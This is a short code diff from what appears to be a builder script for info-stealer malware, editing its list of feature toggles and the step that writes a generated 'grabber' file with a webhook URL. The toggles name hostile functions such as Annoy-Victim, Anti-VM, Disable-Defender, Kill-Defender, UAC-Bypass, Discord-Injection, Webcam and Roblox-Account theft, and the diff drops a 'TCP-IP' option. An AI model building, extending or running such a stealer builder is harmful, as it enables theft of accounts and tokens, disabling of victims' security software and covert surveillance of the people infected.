@@ -9,7 +9,7 @@ def get_enabled_features(config_content):
         'Annoy-Victim', 'Anti-VM', 'Browser-Info', 'Clipboard', 'Discord-Info',
         'Discord-Injection', 'Disable-Defender', 'File-Name', 'Games-Info', 'Kill-Defender',
         'Exact-location', 'Port-Creation', 'Roblox-Account', 'Screenshot', 'Self-destruction',
-        'Self-Exclusion', 'System-Info', 'TCP-IP', 'UAC-Bypass', 'Watch-Dog', 'Webcam',
+        'Self-Exclusion', 'System-Info', 'UAC-Bypass', 'Watch-Dog', 'Webcam',
         'Webhook', 'Filepumper-Value', 'Ping'
       ]
       feature_values = {}
@@ -70,4 +70,3 @@ if 'Discord-Info' in features:
 final_code = f"webhook_url = {webhook_url}\n" + "\n".join(filter(None, combined_code.splitlines()))
 with open(filename, 'w', encoding='utf-8') as grabber_file:
     grabber_file.write(final_code)
-
